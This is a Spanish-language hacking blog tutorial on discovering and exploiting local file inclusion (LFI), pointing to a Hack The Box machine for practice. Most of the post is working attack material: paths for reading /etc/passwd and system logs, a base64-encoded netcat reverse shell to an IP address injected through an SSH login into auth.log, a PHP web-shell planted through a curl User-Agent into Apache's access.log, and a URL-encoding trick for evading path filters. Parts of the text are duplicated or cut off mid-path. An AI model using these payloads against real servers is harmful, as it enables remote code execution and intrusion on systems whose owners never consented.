---
layout: single
title: Descubrimiento y explotacion de LFI (local file inclusion)
date: 2022-05-16
classes: wide
header:
   teaser: /assets/images/hacker-directorios.jpeg
categories:
  -vulnerabilidades
  
  
tags:
  -hacking
---


Hola , hoy os voy a enseñar como explotar y descubrir la vulnerabilidad LFI (local file inclusion) ademas os indico una maquina 
muy para poder praticar.


esta es una vulnerabilidad la cual se suele dar en paginas cuya url llama a algunos archivos del sistema ej: http://ejemplo.com/login?file=login.php.

para poder ver algunas rutas podemos cambiar el destino y en vez de poner login.php podemos poner cualquier archivo del sistema.



      rutas peligrosas en local file inclusion:
      /etc/passwd filtrar por grep = $sh (para ver los usurarios)
      una vez tenemos lo que parece un usuario.
      lo probamos con el
      /home/usuario





una vez que hemos descubierto la vulnerabilidad , para explotarla podemos acceder a estas rutas peligrosas



     otra ruta peligrosa es
    /proc/sched_debug (enumeracion de los progresos del sistema)
    /proc/net/fib_trie (direcciones ip)
    /var/log/auth.log (todos los logs del sistema)



ahora vamos a explotar el poder leer el archivo auth.log






     para conseguir una ejecucion de comandos necesitamos acceder al archivo /var/log/auth.log
     una vez tenemos el archivo podemos crear un payload y codificarlo en base 64 :
     echo "nc -e /bin/bash <ip> 433 | base64; echo
     este es un ejemplo
     echo"nc -e /bin/bash 10.10.105.17 433" | base64; echo
     una vez tenemos el codigo lo copiamos
     este seria el payload final:
     echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK" | base64 -d | bash
     ahora con ssh nos intetamos conectar con el paylodad:
     ssh <?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwNS4xNyA0MzMK | base64 -d | bash
     "); ?> @10.10.105.17 



si no encotramos el archivo o el firewall nos rechaza la conexio podemos probrar a buscar el archivo /var/log/apache2/a>
una vez aqui podemos modificar el user agent con curl para ejecutar comandos:





    si no encotramos el archivo o el firewall nos rechaza la conexio podemos probrar a buscar el archivo /var/log/apache2/a>
    una vez aqui podemos modificar el user agent con curl para ejecutar comandos:
    esto se haria tal que asi:
    curl -s -H "User-Agent: <?php system("which nc"); ?>" "http://10.10.105.17/lfi/lfi.php?page=/var/log/apache2/access.log"
    esto no ejecutara el comando que especificamos en system("") en este caso para ver si podremos obtener una shell con netcat





esta seria otra forma






     otra forma de hacerlo seria utilizando (otra vez el access.log , que se encuentra en la ruta /var/log/apache/access.log
     asi podremos ver los logs y los user agents
     modificando el user agent podemos injectar codigo tal que asi:
     curl "http://example.htb -H "User-Agent : <?php system(\$_GET['bash']); ?>"




algunas paginas utilizan filtros a la hora de filtrar los strings /../ asi que podemos utilizar este:
%ef%bc%8f

MAQUINAS PARA PRACTICAR:
   beep -> hack the box
